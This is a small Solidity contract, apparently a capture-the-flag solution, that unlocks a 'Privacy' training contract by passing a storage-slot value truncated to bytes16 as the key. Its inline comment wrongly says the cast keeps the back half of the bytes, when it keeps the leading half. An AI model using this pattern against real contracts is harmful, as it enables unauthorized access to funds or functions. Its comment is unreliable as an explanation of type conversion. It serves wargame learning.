// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

import "./Privacy.sol";

contract Attack {
    Privacy target;

    constructor(address _targetAddress) public {
        target = Privacy(_targetAddress);
    }

    function unlock(bytes32 _slotValue) public {
        // The below line will explicitly convert out bytes32 into a bytes16. This splits the hex in half and takes the back half. (The 0x remains untouched.)
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }
}
